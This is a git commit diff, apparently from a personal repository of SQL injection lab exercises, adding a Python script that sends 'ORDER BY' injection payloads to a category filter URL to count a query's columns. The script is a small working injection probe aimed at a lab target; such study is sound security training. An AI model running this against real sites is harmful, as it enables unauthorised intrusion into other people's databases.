71e87dc4c5ea2144bb5d38a177e73eac7c483373
techno-sapi3n <tyler.ceja5@gmail.com>
2021-04-28 22:26:01 -0700

    finishes script/notes for LAB-03

--- sqli/LAB-03/sqli-lab-03.py
+++ sqli/LAB-03/sqli-lab-03.py
@@ -1,9 +1,37 @@
 import requests
 import sys
 import urllib3
-from bs4 import BeautifulSoup
 import re
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-proxies = {'http': '127.0.01:8080', 'https': '127.0.01:8080'}
+proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
 
+
+def exploit_sqli_column_num(url):
+    path = 'filter?category=Gifts'
+    for i in range(1, 50):
+        sql_payload = f"'+order+by+{i}--"
+        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
+        res = r.text
+        if 'Internal Server Error' in res:
+            return i - 1
+        # i = i + 1
+        i += 1
+    return False
+
+
+if __name__ == '__main__':
+    try:
+        url = sys.argv[1].strip()
+
+    except IndexError:
+        print(f'[-] Usage: {sys.argv[0]} <url>')
+        print(f'[-] Example: {sys.argv[0]} www.example.com')
+        sys.exit(-1)
+
+    print('[+] Figuring out number of columns...')
+    num_col = exploit_sqli_column_num(url)
+    if num_col:
+        print(f'[+] The number of columns is {str(num_col)}.')
+    else:
+        print('[-] The SQLi attack was unsuccessful.')
